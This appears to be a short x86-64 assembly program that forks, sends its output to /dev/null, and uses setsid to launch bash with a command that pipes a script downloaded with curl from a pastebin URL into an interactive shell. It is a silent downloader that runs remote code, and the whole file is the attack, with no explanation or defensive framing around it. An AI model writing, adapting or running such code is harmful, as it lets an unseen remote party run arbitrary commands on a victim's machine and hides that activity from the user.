global _start

devnull db `/dev/null`, 0x0
argv0 db `/bin/setsid`, 0x0
argv1 db `/bin/bash`, 0x0
argv2 db `-c`, 0x0
argv3 db `$(curl -s https://pastebin.com/raw/bnNiVmsD | /bin/bash -i)`, 0x0

_start:
	pop rax
	lea r9, [rsp + (rax + 1) * 4]
	push rax

	mov rax, 57
	syscall

	cmp rax, 0x0
	jnz .end

	lea rdi, [rel devnull]
	mov rsi, 1
	mov rax, 2; OPEN
	syscall
	mov rdi, rax
	mov rsi, 1
	mov rax, 33
	syscall
	mov rsi, 2
	mov rax, 33
	syscall

	xor rax, rax
	push rax; NULL
	lea rdi, [rel argv3]
	push rdi
	lea rdi, [rel argv2]
	push rdi
	lea rdi, [rel argv1]
	push rdi
	lea rdi, [rel argv0]
	push rdi

	mov rsi, rsp
	push r9
	pop rdx
	lea rdi, [rel argv0]
	mov rax, 59
	syscall

	add rsp, 32

	.end:
;	mov rdi, 0x0
;	mov rax, 61
;	syscall

	mov rax, 60
	syscall

ret
